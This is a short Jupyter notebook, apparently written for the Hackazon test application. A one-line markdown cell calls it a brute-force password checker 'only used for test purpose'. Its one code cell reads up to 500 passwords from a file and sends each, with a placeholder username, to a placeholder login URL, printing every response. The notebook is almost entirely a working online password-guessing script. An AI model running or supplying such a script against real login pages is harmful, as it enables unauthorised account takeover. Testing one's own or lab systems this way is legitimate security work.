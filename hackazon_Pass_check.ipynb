{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Brute Force Password Checker\n",
    "\n",
    "**This code must be only used for test purpose.**\n",
    "\n",
    "The brute force method is used to test all passwords listed in password file on web site <URL>.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import os\n",
    "\n",
    "fo = open(\"<password file>\", \"r\")\n",
    "\n",
    "password = []\n",
    "for i in range (0,500):\n",
    "    line = fo.readline()\n",
    "    password.append(line)\n",
    "fo.close()\n",
    "stripped_password = [s.rstrip() for s in password]\n",
    "for j in range (0,len(stripped_password)):\n",
    "    os.system(\"pause\")\n",
    "    with requests.Session() as s:\n",
    "        payload = {'user': '<user>','password': stripped_password[j]}\n",
    "        p = s.get('https://<URL>', data=payload)\n",
    "        print ('------------',stripped_password[j],'-----------')\n",
    "        print(p.text)\n",
    "\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [default]",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
